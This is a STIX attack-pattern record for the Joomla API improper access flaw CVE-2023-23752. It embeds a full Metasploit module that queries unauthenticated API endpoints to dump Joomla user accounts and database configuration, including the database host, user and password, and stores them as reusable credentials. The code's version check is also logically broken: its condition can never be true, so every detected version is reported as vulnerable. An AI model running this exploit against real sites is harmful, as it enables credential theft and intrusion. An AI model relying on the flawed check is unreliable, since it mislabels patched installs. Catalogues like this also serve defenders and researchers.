{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ea1265ad-4d1c-44a9-8505-ae4f342880b7",
    "created": "2024-08-14T16:29:35.642074Z",
    "modified": "2024-08-14T16:29:35.642078Z",
    "name": "Joomla API Improper Access Checks",
    "description": " Joomla versions between 4.0.0 and 4.2.7, inclusive, contain an improper API access vulnerability. This vulnerability allows unauthenticated users access to webservice endpoints which contain sensitive information. Specifically for this module we exploit the users and config/application endpoints.  This module was tested against Joomla 4.2.7 running on Docker.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/joomla_api_improper_access_checks.rb",
            "external_id": "joomla_api_improper_access_checks.rb"
        },
        {
            "source_name": "reference",
            "url": "https://developer.joomla.org/security-centre/894-20230201-core-improper-access-check-in-webservice-endpoints.html"
        },
        {
            "source_name": "reference",
            "url": "https://nsfocusglobal.com/joomla-unauthorized-access-vulnerability-cve-2023-23752-notice/"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/18qrh3PXIX/cve-2023-23752"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-23752"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HTTP::Joomla\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Joomla API Improper Access Checks',\n        'Description' => %q{\n          Joomla versions between 4.0.0 and 4.2.7, inclusive, contain an improper API access vulnerability.\n          This vulnerability allows unauthenticated users access to webservice endpoints which contain\n          sensitive information. Specifically for this module we exploit the users and config/application\n          endpoints.\n\n          This module was tested against Joomla 4.2.7 running on Docker.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # msf module\n          'Tianji Lab', # original PoC, analysis\n        ],\n        'References' => [\n          ['EDB', '51334'],\n          ['URL', 'https://developer.joomla.org/security-centre/894-20230201-core-improper-access-check-in-webservice-endpoints.html'],\n          ['URL', 'https://nsfocusglobal.com/joomla-unauthorized-access-vulnerability-cve-2023-23752-notice/'],\n          ['URL', 'https://attackerkb.com/topics/18qrh3PXIX/cve-2023-23752'],\n          ['CVE', '2023-23752'],\n        ],\n        'Targets' => [\n          ['Joomla 4.0.0 - 4.2.7', {}],\n        ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [IOC_IN_LOGS]\n        },\n        'DisclosureDate' => '2023-02-01',\n        'DefaultTarget' => 0\n      )\n    )\n    # set the default port, and a URI that a user can set if the app isn't installed to the root\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('TARGETURI', [true, 'The URI of the Joomla Application', '/']),\n      ]\n    )\n  end\n\n  def check_host(_ip)\n    unless joomla_and_online?\n      return Exploit::CheckCode::Unknown(\"#{peer} - Could not connect to web service or not detected as Joomla\")\n    end\n\n    version = joomla_version\n    if version.nil?\n      return Exploit::CheckCode::Safe(\"#{peer} - Unable to determine Joomla Version\")\n    end\n\n    vprint_status(\"Joomla version detected: #{version}\")\n    ver_no = Rex::Version.new(version)\n    if ver_no < Rex::Version.new('4.0.0') && ver_no >= Rex::Version.new('4.2.8')\n      return Exploit::CheckCode::Safe(\"Joomla version #{ver_no} is NOT vulnerable\")\n    end\n\n    Exploit::CheckCode::Appears(\"Joomla version #{ver_no} is vulnerable\")\n  end\n\n  def run_host(ip)\n    vprint_status('Attempting user enumeration')\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'api', 'index.php', 'v1', 'users'),\n      'headers' => {\n        # header is needed, it passes back JSON anyways.\n        'Accept' => '*/*'\n      },\n      'vars_get' => {\n        'public' => 'true'\n      }\n    )\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Page didn't load correctly (response code: #{res.code})\") unless res.code == 200\n\n    tbl = Rex::Text::Table.new(\n      'Header' => 'Joomla Users',\n      'Indent' => 1,\n      'Columns' => ['ID', 'Super User', 'Name', 'Username', 'Email', 'Send Email', 'Register Date', 'Last Visit Date', 'Group Names']\n    )\n\n    users = res.get_json_document\n    fail_with(Failure::UnexpectedReply, 'JSON document not returned') unless users # < json data wasn't properly formatted\n    fail_with(Failure::UnexpectedReply, \"'data' field in JSON document not found\") unless users['data'] # < json data was properly formatted by the expected key wasn't present\n\n    loot_path = store_loot('joomla.users', 'application/json', ip, res.body, 'Joomla Users')\n    print_good(\"Users JSON saved to #{loot_path}\")\n\n    users = users['data']\n    users.each do |user|\n      unless user['type'] == 'users'\n        next\n      end\n\n      tbl << [\n        user['attributes']['id'].to_s,\n        user['attributes']['group_names'].include?('Super Users') ? '*' : '',\n        user['attributes']['name'].to_s,\n        user['attributes']['username'].to_s,\n        user['attributes']['email'].to_s,\n        user['attributes']['sendEmail'].to_s,\n        user['attributes']['registerDate'].to_s,\n        user['attributes']['lastvisitDate'].to_s,\n        user['attributes']['group_names'].to_s,\n      ]\n    end\n\n    print_good(tbl.to_s)\n\n    vprint_status('Attempting config enumeration')\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'api', 'index.php', 'v1', 'config', 'application'),\n      'headers' => {\n        # header is needed, it passes back JSON anyways.\n        'Accept' => '*/*'\n      },\n      'vars_get' => {\n        'public' => 'true'\n      }\n    )\n\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Page didn't load correctly (response code: #{res.code})\") unless res.code == 200\n\n    tbl = Rex::Text::Table.new(\n      'Header' => 'Joomla Config',\n      'Indent' => 1,\n      'Columns' => ['Setting', 'Value']\n    )\n\n    config = res.get_json_document\n    fail_with(Failure::UnexpectedReply, 'JSON document not returned') unless config # < json data wasn't properly formatted\n    fail_with(Failure::UnexpectedReply, \"'data' field in JSON document not found\") unless config['data'] # < json data was properly formatted by the expected key wasn't present\n\n    loot_path = store_loot('joomla.config', 'application/json', ip, res.body, 'Joomla Config')\n    print_good(\"Config JSON saved to #{loot_path}\")\n\n    config = config['data']\n    credential_data = {\n      protocol: 'tcp',\n      workspace_id: myworkspace_id,\n      port: 1, # we dont get this data back so just set it to something obviously wrong instead of guessing\n      origin_type: :service,\n      private_type: :password,\n      module_fullname: fullname,\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }\n    config.each do |setting|\n      if setting['attributes'].key?('dbtype')\n        credential_data[:service_name] = setting['attributes']['dbtype'].to_s\n        if setting['attributes']['dbtype'].to_s == ''\n          credential_data[:port] = '3306' # taking a guess since this info isn't returned but is required for create_credential_and_login\n        end\n        tbl << ['dbtype', setting['attributes']['dbtype'].to_s]\n      elsif setting['attributes'].key?('host')\n        credential_data[:address] = setting['attributes']['host'].to_s\n        tbl << ['db host', setting['attributes']['host'].to_s]\n      elsif setting['attributes'].key?('password')\n        credential_data[:private_data] = setting['attributes']['password']\n        tbl << ['db password', setting['attributes']['password'].to_s]\n      elsif setting['attributes'].key?('user')\n        credential_data[:username] = setting['attributes']['user'].to_s\n        tbl << ['db user', setting['attributes']['user'].to_s]\n      elsif setting['attributes'].key?('db')\n        tbl << ['db name', setting['attributes']['db'].to_s]\n      elsif setting['attributes'].key?('dbprefix')\n        tbl << ['db prefix', setting['attributes']['dbprefix'].to_s]\n      elsif setting['attributes'].key?('dbencryption')\n        tbl << ['db encryption', setting['attributes']['dbencryption'].to_s]\n      end\n    end\n    # if db host isn't a FQDN or IP, this will silently fail to save.\n    create_credential_and_login(credential_data)\n\n    print_good(tbl.to_s)\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-02-01"
}